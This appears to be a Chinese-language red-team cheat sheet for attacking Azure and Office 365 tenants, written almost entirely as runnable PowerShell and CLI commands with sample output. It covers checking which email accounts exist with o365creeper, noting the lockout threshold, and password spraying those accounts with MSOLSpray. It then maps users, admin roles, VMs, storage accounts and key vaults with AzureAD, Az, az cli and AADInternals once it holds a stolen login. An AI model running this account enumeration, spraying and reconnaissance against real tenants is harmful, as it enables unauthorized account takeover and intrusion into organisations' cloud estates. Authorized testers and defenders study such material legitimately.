  #### 枚举有效的电子邮件
  	默认情况下，O365 的锁定策略为 10 次尝试，它将锁定一个帐户1分钟。
	检查电子邮件
	PS> C:\Python27\python.exe C:\Tools\o365creeper\o365creeper.py -f C:\Tools\emails.txt -o C:\Tools\validemails.txt
	admin@<TENANT NAME>.onmicrosoft.com   - VALID
	root@<TENANT NAME>.onmicrosoft.com    - INVALID
	test@<TENANT NAME>.onmicrosoft.com    - VALID
	contact@<TENANT NAME>.onmicrosoft.com - INVALID
	提取具有有效凭据的电子邮件列表：https ://github.com/nyxgeek/o365recon
	密码喷射
	PS> . C:\Tools\MSOLSpray\MSOLSpray.ps1
	PS> Invoke-MSOLSpray -UserList C:\Tools\validemails.txt -Password <PASSWORD> -Verbose
  #### 枚举 Azure 子域
  	PS> . C:\Tools\MicroBurst\Misc\InvokeEnumerateAzureSubDomains.ps1
	PS> Invoke-EnumerateAzureSubDomains -Base <TENANT NAME> -Verbose
	Subdomain Service
	--------- -------
	<TENANT NAME>.mail.protection.outlook.com Email
	<TENANT NAME>.onmicrosoft.com Microsoft Hosted Domain
  #### 使用 Azure AD Powershell 枚举租户
	Import-Module C:\Tools\AzureAD\AzureAD.psd1
	Import-Module C:\Tools\AzureADPreview\AzureADPreview.psd1
	PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
	PS> $creds = New-Object System.Management.Automation.PSCredential("test@<TENANT NAME>.onmicrosoft.com", $passwd)
	PS Az> Connect-AzureAD -Credential $creds

	PS AzureAD> Get-AzureADUser -All $true
	PS AzureAD> Get-AzureADUser -All $true | select UserPrincipalName
	PS AzureAD> Get-AzureADGroup -All $true
	PS AzureAD> Get-AzureADDevice
	PS AzureAD> Get-AzureADDirectoryRole -Filter "DisplayName eq 'Global Administrator'" | Get-AzureADDirectoryRoleMember
	PS AzureADPreview> Get-AzureADMSRoleDefinition | ?{$_.IsBuiltin -eq $False} | select DisplayName
  #### 使用 Az Powershell 枚举租户
  	PS> $passwd = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force
	PS> $creds = New-Object System.Management.Automation.PSCredential ("test@<TENANT NAME>.onmicrosoft.com", $passwd)
	PS Az> Connect-AzAccount -Credential $creds

	PS Az> Get-AzResource
	PS Az> Get-AzRoleAssignment -SignInName test@<TENANT NAME>.onmicrosoft.com
	PS Az> Get-AzVM | fl
	PS Az> Get-AzWebApp | ?{$_.Kind -notmatch "functionapp"}
	PS Az> Get-AzFunctionApp
	PS Az> Get-AzStorageAccount | fl
	PS Az> Get-AzKeyVault
  #### 使用 az cli 枚举租户
  	PS> az login -u test@<TENANT NAME>.onmicrosoft.com -p <PASSWORD>
	PS> az vm list
	PS> az vm list --query "[].[name]" -o table
	PS> az webapp list
	PS> az functionapp list --query "[].[name]" -o table
	PS> az storage account list
	PS> az keyvault list
  #### 手动枚举
  	与 Azure AD 或 O365 联合
	https://login.microsoftonline.com/getuserrealm.srf?login=<USER>@<DOMAIN>&xml=1
	https://login.microsoftonline.com/getuserrealm.srf?login=root@<TENANT NAME>.onmicrosoft.com&xml=1
	获取租户 ID
	https://login.microsoftonline.com/<DOMAIN>/.well-known/openid-configuration
	https://login.microsoftonline.com/<TENANT NAME>.onmicrosoft.com/.well-known/openid-configuration
  #### 枚举方法
  	检查 Azure 加入 
	PS> dsregcmd.exe /status
	+----------------------------------------------------------------------+
	| Device State |
	+----------------------------------------------------------------------+
	 AzureAdJoined : YES
	 EnterpriseJoined : NO
	 DomainJoined : NO
	 Device Name : jumpvm

	枚举资源
	PS Az> Get-AzResource

	枚举角色分配
	PS Az> Get-AzRoleAssignment -Scope /subscriptions/<SUBSCRIPTION-ID>/resourceGroups/RESEARCH/providers/Microsoft.Compute/virtualMachines/<VM-NAME>`

	获取角色信息
	PS Az> Get-AzRoleDefinition -Name "Virtual Machine Command Executor"

	获取信息用户
	PS AzureAD> Get-AzureADUser -ObjectId <ID>
	PS AzureAD> Get-AzureADUser -ObjectId test@<TENANT NAME>.onmicrosoft.com | fl * 

	列出所有组
	PS AzureAD> Get-AzureADGroup -All $true

	列出一个组的用户
	PS Az> Get-AzADGroup -DisplayName '<GROUP-NAME>'
	PS Az> Get-AzADGroupMember -GroupDisplayName '<GROUP-NAME>' | select UserPrincipalName

	获取Azure AD 信息
	PS> Import-Module C:\Tools\AADInternals\AADInternals.psd1
	PS AADInternals> Get-AADIntLoginInformation -UserName admin@<TENANT NAME>.onmicrosoft.com
	PS AADInternals> Get-AADIntTenantID -Domain <TENANT NAME>.onmicrosoft.com # Get Tenant ID
	PS AADInternals> Invoke-AADIntReconAsOutsider -DomainName <DOMAIN> # Get all the information

	检查是否有用户登录到 az cli
	PS> az ad signed-in-user show

	检查 AppID 备用名称/显示名称
	PS AzureAD> Get-AzureADServicePrincipal -All $True | ?{$_.AppId -eq "<APP-ID>"} | fl


	获取使用当前租户注册的所有应用程序对象
	PS AzureAD> Get-AzureADApplication -All $true

	获取有关应用程序的所有详细信息
	PS AzureAD> Get-AzureADApplication -ObjectId <ID> | fl *

	列出用户有权访问的所有 VM
	PS Az> Get-AzVM 
	PS Az> Get-AzVM | fl

	获取所有功能应用
	PS Az> Get-AzFunctionApp

	获取所有网络应用
	PS Az> Get-AzWebApp
	PS Az> Get-AzWebApp | select-object Name, Type, Hostnames

	列出所有存储帐户
	PS Az> Get-AzStorageAccount
	PS Az> Get-AzStorageAccount | fl

	列出所有密钥库
	PS Az> Get-AzKeyVault